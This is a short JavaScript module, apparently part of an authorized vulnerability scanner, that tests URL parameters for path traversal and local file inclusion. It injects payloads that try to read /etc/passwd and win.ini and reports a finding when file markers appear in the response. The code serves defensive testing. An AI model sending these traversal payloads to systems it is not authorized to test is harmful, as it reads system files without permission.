// Dark Matter rule-based scanner — path traversal / LFI probe.
// Oracle: known file-content markers (root:x:0:0 / [extensions]) in the response.
const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';

async function get(url, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, { signal: ctrl.signal, headers: { 'User-Agent': UA, ...(opts.headers || {}) } });
    return await res.text().catch(() => '');
  } finally {
    clearTimeout(t);
  }
}

function withParam(url, name, value) {
  const u = new URL(url);
  u.searchParams.set(name, value);
  return u.toString();
}

const TRAVERSAL_CASES = [
  { payload: '../../../../../../../../etc/passwd', marker: 'root:x:0:0', os: 'unix' },
  { payload: '..\\..\\..\\..\\..\\..\\windows\\win.ini', marker: '[extensions]', os: 'windows' },
];

export async function probeTraversal(url, params, opts = {}) {
  const findings = [];
  for (const param of params.slice(0, 10)) {
    for (const { payload, marker, os } of TRAVERSAL_CASES) {
      let body;
      try {
        body = await get(withParam(url, param, payload), opts);
      } catch {
        continue;
      }
      if (body.includes(marker)) {
        const idx = body.indexOf(marker);
        const window = body.slice(Math.max(0, idx - 60), idx + 120);
        findings.push({
          class: 'lfi',
          id: `traversal-${param}-${os}`,
          title: `Path traversal / local file inclusion in parameter '${param}' (${os})`,
          severity: 'high',
          url,
          param,
          evidence: {
            request: `GET ${withParam(url, param, payload)}`,
            response: `file-content marker present — "...${window}..."`,
            impact_demo: os === 'unix' ? 'read /etc/passwd via traversal' : 'read win.ini via traversal',
            signalCorrelated: true,
          },
        });
        break;
      }
    }
  }
  return findings;
}
